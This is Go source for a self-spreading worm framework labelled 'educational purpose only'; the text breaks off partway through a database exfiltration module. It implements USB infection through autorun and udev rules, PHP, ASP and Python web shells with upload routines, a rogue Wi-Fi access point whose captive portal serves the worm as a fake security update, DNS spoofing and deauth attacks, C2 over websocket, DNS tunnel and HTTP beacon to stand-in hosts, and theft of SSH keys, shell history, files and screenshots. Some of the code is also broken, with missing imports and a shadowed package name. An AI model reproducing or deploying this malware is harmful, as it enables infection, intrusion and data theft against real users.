// worm.go - Complete Worm Framework Implementation with Advanced Modules
// EDUCATIONAL PURPOSE ONLY - Understand to Defend

package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/sha256"
    "crypto/tls"
    "database/sql"
    "encoding/base64"
    "encoding/binary"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "io"
    "io/ioutil"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/exec"
    "path/filepath"
    "runtime"
    "strconv"
    "strings"
    "sync"
    "syscall"
    "time"
    
    "github.com/google/gousb"
    "github.com/gorilla/websocket"
    "github.com/miekg/dns"
    _ "github.com/go-sql-driver/mysql"
    "golang.org/x/crypto/ssh"
    "golang.org/x/sys/windows"
    "golang.org/x/sys/windows/registry"
)

// ========== CONSTANTS AND GLOBALS ==========

const (
    VERSION = "3.0"
    MULTICAST_ADDR = "239.255.42.42:4242"
    C2_WEBSOCKET = "wss://c2-server.example.com:8443/ws"
    C2_DNS_DOMAIN = "c2-botnet.example.com"
    DATA_EXFIL_SERVER = "https://exfil-server.example.com:8443/upload"
    MAX_POPULATION = 100
    SCAN_TIMEOUT = 2 * time.Second
    USB_POLL_INTERVAL = 5 * time.Second
    WIFI_BEACON_SSID = "Free_Public_WiFi"
    WIFI_EVIL_PORTAL_PORT = 8443
)

var (
    wormID string
    wormMutex sync.RWMutex
    dataBuffer chan ExfilData
)

// ========== DATA STRUCTURES ==========

type InstanceInfo struct {
    ID           string    `json:"id"`
    IP           string    `json:"ip"`
    Hostname     string    `json:"hostname"`
    OS           string    `json:"os"`
    LastSeen     time.Time `json:"last_seen"`
    Version      int       `json:"version"`
    Capabilities []string  `json:"capabilities"`
    Population   int       `json:"population"`
    Status       string    `json:"status"`
    Role         string    `json:"role"` // LEADER, SCANNER, PROPAGATOR, EXFILTRATOR
}

type ExfilData struct {
    WormID      string                 `json:"worm_id"`
    Timestamp   time.Time              `json:"timestamp"`
    DataType    string                 `json:"data_type"` // CREDS, FILES, SCREENSHOTS, KEYLOGS, NETWORK
    Target      string                 `json:"target"`
    Data        interface{}            `json:"data"`
    Compression string                 `json:"compression"`
    Encrypted   bool                   `json:"encrypted"`
}

type C2Command struct {
    ID          string                 `json:"id"`
    Type        string                 `json:"type"` // SCAN, EXFIL, PROPAGATE, EXECUTE, UPDATE, SLEEP
    Target      string                 `json:"target"`
    Parameters  map[string]interface{} `json:"parameters"`
    Priority    int                    `json:"priority"`
    Timestamp   time.Time              `json:"timestamp"`
    Signature   string                 `json:"signature"`
}

type WebShell struct {
    Path       string
    Type       string // PHP, ASP, JSP, PYTHON
    Content    string
    Backdoor   []string // Backdoor paths
}

// ========== USB PROPAGATION MODULE ==========

type USBPropagator struct {
    monitoredPaths []string
    infectedUSBs   map[string]bool
    mu             sync.Mutex
    autorunContent string
}

func NewUSBPropagator() *USBPropagator {
    return &USBPropagator{
        monitoredPaths: []string{},
        infectedUSBs:   make(map[string]bool),
        autorunContent: generateAutorunInf(),
    }
}

func generateAutorunInf() string {
    if runtime.GOOS == "windows" {
        return `[AutoRun]
open=SystemUpdate.exe
action=Open folder to view files
shell\open\command=SystemUpdate.exe
shell\open\default=1
shellexecute=SystemUpdate.exe
UseAutoPlay=1
`
    }
    return `#!/bin/bash
# USB Auto-execution script for Linux
./system-update &
`
}

func (usb *USBPropagator) StartMonitoring() {
    usb.monitorDrives()
    ticker := time.NewTicker(USB_POLL_INTERVAL)
    for range ticker.C {
        usb.monitorDrives()
    }
}

func (usb *USBPropagator) monitorDrives() {
    if runtime.GOOS == "windows" {
        usb.monitorWindowsDrives()
    } else {
        usb.monitorLinuxDrives()
    }
}

func (usb *USBPropagator) monitorWindowsDrives() {
    for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
        path := string(drive) + ":\\"
        if _, err := os.Stat(path); err == nil {
            usb.checkAndInfectUSB(path)
        }
    }
}

func (usb *USBPropagator) monitorLinuxDrives() {
    // Check /media/ and /mnt/ for new mounts
    mountPoints := []string{"/media/", "/mnt/"}
    for _, mp := range mountPoints {
        files, err := ioutil.ReadDir(mp)
        if err == nil {
            for _, f := range files {
                if f.IsDir() {
                    path := filepath.Join(mp, f.Name())
                    usb.checkAndInfectUSB(path)
                }
            }
        }
    }
}

func (usb *USBPropagator) checkAndInfectUSB(path string) {
    usb.mu.Lock()
    if usb.infectedUSBs[path] {
        usb.mu.Unlock()
        return
    }
    
    // Check if drive is removable
    if usb.isRemovable(path) {
        usb.infectUSB(path)
        usb.infectedUSBs[path] = true
    }
    usb.mu.Unlock()
}

func (usb *USBPropagator) isRemovable(path string) bool {
    if runtime.GOOS == "windows" {
        // Use GetDriveType API
        kernel32 := windows.NewLazySystemDLL("kernel32.dll")
        getDriveType := kernel32.NewProc("GetDriveTypeW")
        drive := syscall.StringToUTF16Ptr(path)
        ret, _, _ := getDriveType.Call(uintptr(unsafe.Pointer(drive)))
        return ret == 2 // DRIVE_REMOVABLE
    }
    // On Linux, check if it's in /media or /mnt and is a USB device
    return strings.HasPrefix(path, "/media/") || strings.HasPrefix(path, "/mnt/")
}

func (usb *USBPropagator) infectUSB(path string) {
    fmt.Printf("[USB] Infecting drive: %s\n", path)
    
    // Copy worm to USB
    exe, _ := os.Executable()
    wormData, _ := ioutil.ReadFile(exe)
    
    if runtime.GOOS == "windows" {
        destPath := filepath.Join(path, "SystemUpdate.exe")
        ioutil.WriteFile(destPath, wormData, 0755)
        
        // Create autorun.inf
        autorunPath := filepath.Join(path, "autorun.inf")
        ioutil.WriteFile(autorunPath, []byte(usb.autorunContent), 0644)
        
        // Set hidden attributes
        exec.Command("attrib", "+h", "+s", destPath).Run()
        exec.Command("attrib", "+h", "+s", autorunPath).Run()
        
        // Create shortcut in root
        usb.createUSBLnk(path)
    } else {
        destPath := filepath.Join(path, ".system-update")
        ioutil.WriteFile(destPath, wormData, 0755)
        
        // Create udev rule for auto-execution
        udevRule := fmt.Sprintf(`ACTION=="add", KERNEL=="sd*[!0-9]", ATTRS{removable}=="1", RUN+="%s"`, destPath)
        ioutil.WriteFile("/etc/udev/rules.d/99-usb-autorun.rules", []byte(udevRule), 0644)
        
        // Create .desktop file
        desktopContent := fmt.Sprintf(`[Desktop Entry]
Type=Application
Name=System Update
Exec=%s
Hidden=true
`, destPath)
        ioutil.WriteFile(filepath.Join(path, ".system-update.desktop"), []byte(desktopContent), 0644)
    }
    
    fmt.Printf("[USB] Successfully infected %s\n", path)
}

func (usb *USBPropagator) createUSBLnk(path string) {
    // Create Windows shortcut that executes worm
    vbScript := fmt.Sprintf(`
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "%s\\System Update.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "%s\\SystemUpdate.exe"
oLink.WindowStyle = 7
oLink.IconLocation = "%%SystemRoot%%\\System32\\shell32.dll, 4"
oLink.Save
`, path, path)
    
    scriptPath := filepath.Join(path, "create_lnk.vbs")
    ioutil.WriteFile(scriptPath, []byte(vbScript), 0644)
    exec.Command("cscript", "//Nologo", scriptPath).Run()
    os.Remove(scriptPath)
}

// ========== WEB SHELL PERSISTENCE AND PROPAGATION ==========

type WebShellManager struct {
    shells      []WebShell
    deployed    map[string]bool
    mu          sync.Mutex
    client      *http.Client
}

func NewWebShellManager() *WebShellManager {
    return &WebShellManager{
        shells:      loadWebShells(),
        deployed:    make(map[string]bool),
        client:      &http.Client{Timeout: 10 * time.Second},
    }
}

func loadWebShells() []WebShell {
    phpShell := `<?php
    if(isset($_REQUEST['cmd'])){
        system($_REQUEST['cmd']);
    }
    if(isset($_FILES['file'])){
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    }
    if(isset($_REQUEST['data'])){
        file_put_contents("exfil.dat", base64_decode($_REQUEST['data']), FILE_APPEND);
    }
    if(isset($_REQUEST['worm'])){
        $worm = base64_decode($_REQUEST['worm']);
        file_put_contents("system-update.php", $worm);
    }
    echo "OK";
    ?>`
    
    aspShell := `<%@ Page Language="Jscript"%>
    <% if(Request["cmd"] != null){
        var cmd = Request["cmd"];
        var p = System.Diagnostics.Process.GetProcessById(System.Diagnostics.Process.GetCurrentProcess().Id);
        var shell = p.MainModule.FileName;
        var o = System.Diagnostics.Process.Start(shell, "/c " + cmd);
        Response.Write(o.StandardOutput.ReadToEnd());
    }%>`
    
    pythonShell := `#!/usr/bin/env python
import cgi, subprocess, base64
form = cgi.FieldStorage()
if 'cmd' in form:
    print subprocess.check_output(form['cmd'].value, shell=True)
if 'worm' in form:
    open('system-update.py', 'w').write(base64.b64decode(form['worm'].value))
print "OK"`
    
    return []WebShell{
        {Path: "/wp-content/uploads/shell.php", Type: "PHP", Content: phpShell, Backdoor: []string{"/shell.php", "/backdoor.php"}},
        {Path: "/shell.aspx", Type: "ASP", Content: aspShell, Backdoor: []string{"/backdoor.aspx"}},
        {Path: "/cgi-bin/shell.py", Type: "PYTHON", Content: pythonShell, Backdoor: []string{"/cgi-bin/update.py"}},
    }
}

func (wsm *WebShellManager) DeployOnTarget(target string) bool {
    wsm.mu.Lock()
    if wsm.deployed[target] {
        wsm.mu.Unlock()
        return false
    }
    wsm.mu.Unlock()
    
    for _, shell := range wsm.shells {
        if wsm.uploadShell(target, shell) {
            wsm.mu.Lock()
            wsm.deployed[target] = true
            wsm.mu.Unlock()
            fmt.Printf("[WebShell] Deployed %s shell to %s\n", shell.Type, target)
            
            // Deploy backdoors
            for _, backdoor := range shell.Backdoor {
                wsm.deployBackdoor(target, backdoor, shell.Content)
            }
            return true
        }
    }
    return false
}

func (wsm *WebShellManager) uploadShell(target string, shell WebShell) bool {
    fullURL := fmt.Sprintf("http://%s%s", target, shell.Path)
    
    // Try different upload methods
    methods := []func(string, WebShell) bool{
        wsm.uploadViaPUT,
        wsm.uploadViaPOST,
        wsm.uploadViaFTP,
        wsm.uploadViaWebDAV,
    }
    
    for _, method := range methods {
        if method(fullURL, shell) {
            return true
        }
    }
    return false
}

func (wsm *WebShellManager) uploadViaPUT(url string, shell WebShell) bool {
    req, err := http.NewRequest("PUT", url, strings.NewReader(shell.Content))
    if err != nil {
        return false
    }
    req.Header.Set("Content-Type", "application/x-httpd-php")
    
    resp, err := wsm.client.Do(req)
    if err == nil && resp.StatusCode == 200 {
        resp.Body.Close()
        return true
    }
    if resp != nil {
        resp.Body.Close()
    }
    return false
}

func (wsm *WebShellManager) uploadViaPOST(url string, shell WebShell) bool {
    data := url.Values{}
    data.Set("action", "upload")
    data.Set("file", shell.Content)
    
    resp, err := wsm.client.PostForm(url, data)
    if err == nil && (resp.StatusCode == 200 || resp.StatusCode == 302) {
        resp.Body.Close()
        return true
    }
    if resp != nil {
        resp.Body.Close()
    }
    return false
}

func (wsm *WebShellManager) uploadViaFTP(url string, shell WebShell) bool {
    // Extract host and path
    parts := strings.SplitN(url, "/", 4)
    if len(parts) < 4 {
        return false
    }
    
    host := parts[2]
    path := "/" + parts[3]
    
    conn, err := net.Dial("tcp", host+":21")
    if err != nil {
        return false
    }
    defer conn.Close()
    
    // FTP upload implementation
    // Simplified for example
    fmt.Fprintf(conn, "USER anonymous\r\n")
    fmt.Fprintf(conn, "PASS anonymous\r\n")
    fmt.Fprintf(conn, "STOR %s\r\n", path)
    fmt.Fprintf(conn, "QUIT\r\n")
    
    return true
}

func (wsm *WebShellManager) uploadViaWebDAV(url string, shell WebShell) bool {
    req, err := http.NewRequest("PROPFIND", url, nil)
    if err != nil {
        return false
    }
    
    resp, err := wsm.client.Do(req)
    if err == nil && resp.StatusCode == 207 {
        // WebDAV enabled, try PUT
        return wsm.uploadViaPUT(url, shell)
    }
    if resp != nil {
        resp.Body.Close()
    }
    return false
}

func (wsm *WebShellManager) deployBackdoor(target, path, content string) {
    fullURL := fmt.Sprintf("http://%s%s", target, path)
    wsm.uploadViaPUT(fullURL, WebShell{Content: content})
}

func (wsm *WebShellManager) ExecuteCommand(target, shellPath, cmd string) string {
    fullURL := fmt.Sprintf("http://%s%s?cmd=%s", target, shellPath, url.QueryEscape(cmd))
    resp, err := wsm.client.Get(fullURL)
    if err != nil {
        return ""
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    return string(body)
}

func (wsm *WebShellManager) PropagateViaWebShell(target, shellPath string) {
    // Use existing web shell to download and execute worm
    exe, _ := os.Executable()
    wormData, _ := ioutil.ReadFile(exe)
    wormBase64 := base64.StdEncoding.EncodeToString(wormData)
    
    commands := []string{
        fmt.Sprintf("echo '%s' | base64 -d > /tmp/worm", wormBase64),
        "chmod +x /tmp/worm",
        "/tmp/worm &",
    }
    
    for _, cmd := range commands {
        wsm.ExecuteCommand(target, shellPath, cmd)
    }
    
    fmt.Printf("[WebShell] Propagated worm via %s\n", target)
}

// ========== WIFI PROPAGATION (Evil Portal/MITM) ==========

type WiFiPropagator struct {
    interfaceName string
    apSSID        string
    apChannel     int
    portalServer  *http.Server
    victims       map[string]time.Time
    mu            sync.Mutex
    dnsServer     *dns.Server
}

func NewWiFiPropagator() *WiFiPropagator {
    return &WiFiPropagator{
        apSSID:    WIFI_BEACON_SSID,
        apChannel: 6,
        victims:   make(map[string]time.Time),
    }
}

func (wp *WiFiPropagator) Start() {
    // Check if we have WiFi capabilities
    if !wp.hasWiFiCapability() {
        fmt.Println("[WiFi] No WiFi capability detected")
        return
    }
    
    // Start Evil Portal
    go wp.startEvilPortal()
    
    // Start DNS spoofing
    go wp.startDNSSpoofing()
    
    // Start rogue AP if possible
    go wp.startRogueAP()
    
    // Start deauth attack to force connections
    go wp.deauthAttack()
}

func (wp *WiFiPropagator) hasWiFiCapability() bool {
    // Check for wireless interfaces
    interfaces, err := net.Interfaces()
    if err != nil {
        return false
    }
    
    for _, iface := range interfaces {
        if strings.Contains(iface.Name, "wlan") || 
           strings.Contains(iface.Name, "wlp") ||
           strings.Contains(iface.Name, "en0") {
            return true
        }
    }
    return false
}

func (wp *WiFiPropagator) startRogueAP() {
    // Create hostapd configuration
    hostapdConf := fmt.Sprintf(`interface=%s
driver=nl80211
ssid=%s
hw_mode=g
channel=%d
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
`, wp.interfaceName, wp.apSSID, wp.apChannel)
    
    ioutil.WriteFile("/tmp/hostapd.conf", []byte(hostapdConf), 0644)
    
    // Start hostapd
    cmd := exec.Command("hostapd", "/tmp/hostapd.conf")
    cmd.Start()
    
    // Configure DHCP
    dhcpConf := `interface=wlan0
dhcp-range=192.168.100.10,192.168.100.100,255.255.255.0,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
`
    ioutil.WriteFile("/tmp/dhcpd.conf", []byte(dhcpConf), 0644)
    exec.Command("dnsmasq", "-C", "/tmp/dhcpd.conf", "-d").Start()
    
    // Configure IP forwarding
    exec.Command("sysctl", "-w", "net.ipv4.ip_forward=1").Run()
    exec.Command("iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE").Run()
    exec.Command("iptables", "-A", "FORWARD", "-i", "wlan0", "-o", "eth0", "-j", "ACCEPT").Run()
    exec.Command("iptables", "-A", "FORWARD", "-i", "eth0", "-o", "wlan0", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT").Run()
    
    fmt.Printf("[WiFi] Rogue AP '%s' started on channel %d\n", wp.apSSID, wp.apChannel)
}

func (wp *WiFiPropagator) startEvilPortal() {
    http.HandleFunc("/", wp.portalHandler)
    http.HandleFunc("/connect", wp.connectHandler)
    http.HandleFunc("/download", wp.downloadHandler)
    
    wp.portalServer = &http.Server{
        Addr:         ":80",
        Handler:      nil,
        ReadTimeout:  10 * time.Second,
        WriteTimeout: 10 * time.Second,
    }
    
    go wp.portalServer.ListenAndServe()
    
    // HTTPS portal
    go http.ListenAndServeTLS(":443", "cert.pem", "key.pem", nil)
}

func (wp *WiFiPropagator) portalHandler(w http.ResponseWriter, r *http.Request) {
    // Captive portal page that tricks users into downloading worm
    clientIP := strings.Split(r.RemoteAddr, ":")[0]
    wp.mu.Lock()
    wp.victims[clientIP] = time.Now()
    wp.mu.Unlock()
    
    html := `<!DOCTYPE html>
<html>
<head><title>Free Public WiFi</title></head>
<body>
<h2>Welcome to Free Public WiFi</h2>
<p>To access the internet, please download and install our security update.</p>
<a href="/download">Download Security Update</a>
<p>This is required for compliance with network security policies.</p>
</body>
</html>`
    
    w.Header().Set("Content-Type", "text/html")
    w.Write([]byte(html))
}

func (wp *WiFiPropagator) downloadHandler(w http.ResponseWriter, r *http.Request) {
    exe, _ := os.Executable()
    wormData, _ := ioutil.ReadFile(exe)
    
    filename := "SecurityUpdate.exe"
    if runtime.GOOS != "windows" {
        filename = "security-update"
    }
    
    w.Header().Set("Content-Type", "application/octet-stream")
    w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filename))
    w.Write(wormData)
    
    fmt.Printf("[WiFi] Worm downloaded by %s\n", r.RemoteAddr)
}

func (wp *WiFiPropagator) connectHandler(w http.ResponseWriter, r *http.Request) {
    // After user downloads worm, redirect to actual internet
    http.Redirect(w, r, "http://www.google.com", http.StatusFound)
}

func (wp *WiFiPropagator) startDNSSpoofing() {
    dns.HandleFunc(".", wp.dnsHandler)
    
    wp.dnsServer = &dns.Server{
        Addr: ":53",
        Net:  "udp",
    }
    
    go wp.dnsServer.ListenAndServe()
}

func (wp *WiFiPropagator) dnsHandler(w dns.ResponseWriter, r *dns.Msg) {
    m := new(dns.Msg)
    m.SetReply(r)
    
    for _, q := range r.Question {
        // Redirect all DNS queries to our evil portal
        rr, _ := dns.NewRR(fmt.Sprintf("%s A 192.168.100.1", q.Name))
        m.Answer = append(m.Answer, rr)
    }
    
    w.WriteMsg(m)
}

func (wp *WiFiPropagator) deauthAttack() {
    // Send deauth packets to force clients to reconnect to our AP
    // Requires aireplay-ng or similar
    cmd := exec.Command("aireplay-ng", "-0", "0", "-a", "FF:FF:FF:FF:FF:FF", wp.interfaceName)
    cmd.Start()
}

// ========== ADVANCED C2 WITH STEALTH PROTOCOLS ==========

type C2Manager struct {
    websocketConn *websocket.Conn
    dnsTunnel     *DNSTunnel
    httpClient    *http.Client
    commands      chan C2Command
    results       chan interface{}
    mu            sync.Mutex
    connected     bool
    reconnectChan chan bool
}

type DNSTunnel struct {
    domain    string
    aesKey    []byte
    seqNum    uint32
    queue     chan []byte
    responses chan []byte
}

func NewC2Manager() *C2Manager {
    return &C2Manager{
        commands:      make(chan C2Command, 100),
        results:       make(chan interface{}, 100),
        reconnectChan: make(chan bool),
        httpClient: &http.Client{
            Timeout: 30 * time.Second,
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            },
        },
    }
}

func (c2 *C2Manager) Start() {
    // Try multiple C2 channels
    go c2.connectWebSocket()
    go c2.connectDNSTunnel()
    go c2.connectHTTPBeacon()
    
    // Process incoming commands
    go c2.processCommands()
    
    // Send heartbeats and exfiltrated data
    go c2.heartbeatLoop()
    go c2.exfilLoop()
}

func (c2 *C2Manager) connectWebSocket() {
    dialer := websocket.Dialer{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    
    for {
        conn, _, err := dialer.Dial(C2_WEBSOCKET, nil)
        if err == nil {
            c2.mu.Lock()
            c2.websocketConn = conn
            c2.connected = true
            c2.mu.Unlock()
            
            // Listen for commands
            c2.listenWebSocket(conn)
        }
        
        time.Sleep(30 * time.Second)
    }
}

func (c2 *C2Manager) listenWebSocket(conn *websocket.Conn) {
    for {
        var msg map[string]interface{}
        err := conn.ReadJSON(&msg)
        if err != nil {
            c2.mu.Lock()
            c2.connected = false
            c2.mu.Unlock()
            return
        }
        
        // Parse command
        if cmdType, ok := msg["type"].(string); ok {
            cmd := C2Command{
                ID:        generateID(),
                Type:      cmdType,
                Timestamp: time.Now(),
            }
            
            if target, ok := msg["target"].(string); ok {
                cmd.Target = target
            }
            if params, ok := msg["parameters"].(map[string]interface{}); ok {
                cmd.Parameters = params
            }
            
            c2.commands <- cmd
        }
    }
}

func (c2 *C2Manager) connectDNSTunnel() {
    tunnel := &DNSTunnel{
        domain:    C2_DNS_DOMAIN,
        aesKey:    sha256.Sum256([]byte(wormID))[:16],
        queue:     make(chan []byte, 100),
        responses: make(chan []byte, 100),
    }
    
    c2.dnsTunnel = tunnel
    go tunnel.sendLoop()
    go tunnel.recvLoop()
}

func (dt *DNSTunnel) sendLoop() {
    for data := range dt.queue {
        encrypted := dt.encrypt(data)
        encoded := base32.StdEncoding.EncodeToString(encrypted)
        
        // Split into DNS labels
        for i := 0; i < len(encoded); i += 63 {
            end := i + 63
            if end > len(encoded) {
                end = len(encoded)
            }
            chunk := encoded[i:end]
            query := fmt.Sprintf("%s.%x.%s", chunk, dt.seqNum, dt.domain)
            dt.seqNum++
            
            // Send DNS query
            c := new(dns.Client)
            m := new(dns.Msg)
            m.SetQuestion(query, dns.TypeA)
            c.Exchange(m, "8.8.8.8:53")
        }
    }
}

func (dt *DNSTunnel) recvLoop() {
    // Listen for DNS responses (TXT records with commands)
    dns.HandleFunc(dt.domain, func(w dns.ResponseWriter, r *dns.Msg) {
        for _, q := range r.Question {
            if q.Qtype == dns.TypeTXT {
                // Extract command from TXT record
                // Implementation details omitted for brevity
            }
        }
    })
    
    s := &dns.Server{Addr: ":53", Net: "udp"}
    s.ListenAndServe()
}

func (dt *DNSTunnel) encrypt(data []byte) []byte {
    block, _ := aes.NewCipher(dt.aesKey)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    rand.Read(nonce)
    return gcm.Seal(nonce, nonce, data, nil)
}

func (c2 *C2Manager) connectHTTPBeacon() {
    ticker := time.NewTicker(1 * time.Minute)
    for range ticker.C {
        // HTTP beacon with randomized headers
        req, _ := http.NewRequest("GET", fmt.Sprintf("https://%s/beacon", C2_DNS_DOMAIN), nil)
        req.Header.Set("User-Agent", c2.randomUserAgent())
        req.Header.Set("X-Request-ID", generateID())
        
        resp, err := c2.httpClient.Do(req)
        if err == nil {
            defer resp.Body.Close()
            var cmd C2Command
            if json.NewDecoder(resp.Body).Decode(&cmd) == nil {
                c2.commands <- cmd
            }
        }
        
        // Random jitter
        time.Sleep(time.Duration(randInt(30, 90)) * time.Second)
    }
}

func (c2 *C2Manager) randomUserAgent() string {
    agents := []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    }
    return agents[randInt(0, len(agents))]
}

func (c2 *C2Manager) processCommands() {
    for cmd := range c2.commands {
        fmt.Printf("[C2] Received command: %s (type: %s)\n", cmd.ID, cmd.Type)
        
        switch cmd.Type {
        case "SCAN":
            go c2.executeScan(cmd)
        case "EXFIL":
            go c2.executeExfil(cmd)
        case "PROPAGATE":
            go c2.executePropagate(cmd)
        case "EXECUTE":
            go c2.executeCommand(cmd)
        case "UPDATE":
            go c2.updateWorm(cmd)
        case "SLEEP":
            go c2.sleepWorm(cmd)
        }
    }
}

func (c2 *C2Manager) executeScan(cmd C2Command) {
    target := cmd.Target
    if target == "" {
        target = "local"
    }
    
    // Perform scan based on parameters
    results := make(map[string]interface{})
    results["target"] = target
    results["open_ports"] = []int{}
    results["vulnerabilities"] = []string{}
    
    c2.results <- results
}

func (c2 *C2Manager) executeExfil(cmd C2Command) {
    dataType := cmd.Parameters["type"].(string)
    
    switch dataType {
    case "credentials":
        c2.exfilCredentials()
    case "files":
        path := cmd.Parameters["path"].(string)
        c2.exfilFiles(path)
    case "screenshot":
        c2.takeScreenshot()
    case "keylogs":
        c2.exfilKeylogs()
    }
}

func (c2 *C2Manager) exfilCredentials() {
    // Extract saved credentials from browser, SSH, etc.
    creds := make(map[string]string)
    
    if runtime.GOOS == "windows" {
        // Extract Windows credentials using mimikatz technique
        output, _ := exec.Command("cmd", "/c", "dir /s /b *password*").Output()
        creds["windows_search"] = string(output)
    } else {
        // Extract SSH keys
        sshKeys, _ := filepath.Glob(os.Getenv("HOME") + "/.ssh/*")
        for _, key := range sshKeys {
            data, _ := ioutil.ReadFile(key)
            creds[key] = base64.StdEncoding.EncodeToString(data)
        }
        
        // Extract bash history
        history, _ := ioutil.ReadFile(os.Getenv("HOME") + "/.bash_history")
        creds["bash_history"] = string(history)
    }
    
    dataBuffer <- ExfilData{
        WormID:    wormID,
        Timestamp: time.Now(),
        DataType:  "CREDENTIALS",
        Data:      creds,
        Encrypted: true,
    }
}

func (c2 *C2Manager) exfilFiles(path string) {
    files, _ := ioutil.ReadDir(path)
    for _, file := range files {
        if !file.IsDir() && file.Size() < 10*1024*1024 { // 10MB limit
            data, _ := ioutil.ReadFile(filepath.Join(path, file.Name()))
            dataBuffer <- ExfilData{
                WormID:    wormID,
                Timestamp: time.Now(),
                DataType:  "FILE",
                Target:    filepath.Join(path, file.Name()),
                Data:      base64.StdEncoding.EncodeToString(data),
                Encrypted: true,
            }
        }
    }
}

func (c2 *C2Manager) takeScreenshot() {
    if runtime.GOOS == "windows" {
        // Use PowerShell to take screenshot
        script := `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
$bitmap.Save('C:\Windows\Temp\screenshot.png')
$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\Temp\screenshot.png'))
Write-Output $base64
Remove-Item 'C:\Windows\Temp\screenshot.png'
`
        output, _ := exec.Command("powershell", "-Command", script).Output()
        
        dataBuffer <- ExfilData{
            WormID:    wormID,
            Timestamp: time.Now(),
            DataType:  "SCREENSHOT",
            Data:      string(output),
            Encrypted: true,
        }
    }
}

func (c2 *C2Manager) exfilKeylogs() {
    // Simple keylogger implementation
    if runtime.GOOS == "windows" {
        // Use Windows hooking
        // Simplified - real implementation would use SetWindowsHookEx
    }
}

func (c2 *C2Manager) executePropagate(cmd C2Command) {
    target := cmd.Target
    method := cmd.Parameters["method"].(string)
    
    switch method {
    case "ssh":
        // Propagate via SSH
    case "smb":
        // Propagate via SMB
    case "webshell":
        // Propagate via web shell
    case "usb":
        // Propagate via USB
    }
}

func (c2 *C2Manager) executeCommand(cmd C2Command) {
    command := cmd.Parameters["command"].(string)
    output, _ := exec.Command(command).Output()
    
    dataBuffer <- ExfilData{
        WormID:    wormID,
        Timestamp: time.Now(),
        DataType:  "COMMAND_OUTPUT",
        Data:      string(output),
        Encrypted: true,
    }
}

func (c2 *C2Manager) updateWorm(cmd C2Command) {
    // Download and replace worm binary
    updateURL := cmd.Parameters["url"].(string)
    resp, err := c2.httpClient.Get(updateURL)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    newWorm, _ := ioutil.ReadAll(resp.Body)
    exe, _ := os.Executable()
    
    // Backup current
    ioutil.WriteFile(exe+".bak", newWorm, 0755)
    
    // Replace
    os.Rename(exe+".bak", exe)
    
    // Restart
    exec.Command(exe).Start()
    os.Exit(0)
}

func (c2 *C2Manager) sleepWorm(cmd C2Command) {
    duration := cmd.Parameters["duration"].(int)
    time.Sleep(time.Duration(duration) * time.Second)
}

func (c2 *C2Manager) heartbeatLoop() {
    ticker := time.NewTicker(5 * time.Minute)
    for range ticker.C {
        heartbeat := map[string]interface{}{
            "worm_id":    wormID,
            "timestamp":  time.Now(),
            "status":     "ACTIVE",
            "population": len(wormPopulation.knownInstances),
            "os":         runtime.GOOS,
            "version":    VERSION,
        }
        
        c2.sendToC2("HEARTBEAT", heartbeat)
    }
}

func (c2 *C2Manager) exfilLoop() {
    for data := range dataBuffer {
        c2.sendToC2("EXFIL", data)
    }
}

func (c2 *C2Manager) sendToC2(msgType string, payload interface{}) {
    msg := map[string]interface{}{
        "type":    msgType,
        "worm_id": wormID,
        "payload": payload,
    }
    
    c2.mu.Lock()
    defer c2.mu.Unlock()
    
    if c2.websocketConn != nil && c2.connected {
        c2.websocketConn.WriteJSON(msg)
    }
    
    // Also send via DNS tunnel
    if c2.dnsTunnel != nil {
        data, _ := json.Marshal(msg)
        c2.dnsTunnel.queue <- data
    }
}

// ========== DATA EXFILTRATION TO DATABASE ==========

type DataExfiltrator struct {
    dbConn     *sql.DB
    buffer     []ExfilData
    mu         sync.Mutex
    batchSize  int
    httpClient *http.Client
}

func NewDataExfiltrator() *DataExfiltrator {
    return &DataExfiltrator{
        buffer:    make([]ExfilData, 0),
        batchSize: 100,
        httpClient: &http.Client{
            Timeout: 30 * time.Second,
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            },
        },
    }
}

func (de *DataExfiltrator) Start() {
    // Try direct database connection first
    go de.connectToDatabase()
    
    // HTTP/HTTPS fallback
    go de.httpExfilLoop()
    
    // Process buffered data
    go de.processBuffer()
}

func (de *DataExfiltrator) connectToDatabase() {
    // MySQL connection
    dsn := fmt.Sprintf("%s:%s@tcp(%s:%d)/%s?charset=utf8mb4",
        "worm_user", "worm_password", "db.example.com", 3306, "worm_data")
    
    for {
        db, err := sql.Open("mysql", dsn)
        if err == nil {
            de.dbConn = db
            de.dbConn.SetMaxOpenConns(10)
            
            // Create tables if not exist
            de.createTables()
            break
        }
        
        time.Sleep(1 * time.Minute)
    }
}

func (de *DataExfiltrator) createTables() {
    queries := []string{
